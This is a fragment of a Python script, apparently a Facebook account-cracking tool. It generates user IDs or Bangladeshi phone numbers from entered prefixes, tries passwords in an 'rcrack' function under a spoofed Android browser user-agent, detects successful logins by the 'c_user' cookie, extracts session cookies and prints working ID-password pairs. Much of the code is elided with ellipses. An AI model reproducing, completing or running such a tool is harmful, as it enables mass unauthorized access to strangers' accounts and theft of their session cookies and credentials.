...
def random_uid():
    ...
    print('\n\033[1;33mExample: bangladesh,i love you,12345678 ... \033[0;97m')
...
def random_number():
    ...
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 017,018,016,019,015,014,013 .\033[0;97m')
    kode = input('Put code: ')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.3.6.0',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[SK-OK] '+uid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[SK-CP] '+uid+' | '+ps+'\033[0;97m')
